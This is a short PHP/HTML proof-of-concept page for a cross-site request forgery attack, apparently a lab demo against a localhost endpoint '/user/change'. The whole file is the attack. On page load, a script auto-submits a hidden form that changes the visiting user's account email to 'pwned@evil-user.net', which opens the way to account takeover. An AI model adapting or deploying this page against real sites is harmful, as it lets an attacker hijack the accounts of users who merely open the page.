<?php

$link = "http://localhost:8000/user/change"; // The link to the vulnerable action

?>

<html>
    <body>
        <form action="<?php echo $link; ?>" method="POST">
            <input type="hidden" name="email" value="pwned@evil-user.net" />
        </form>
        <script>
            document.forms[0].submit();
        </script>
    </body>
</html>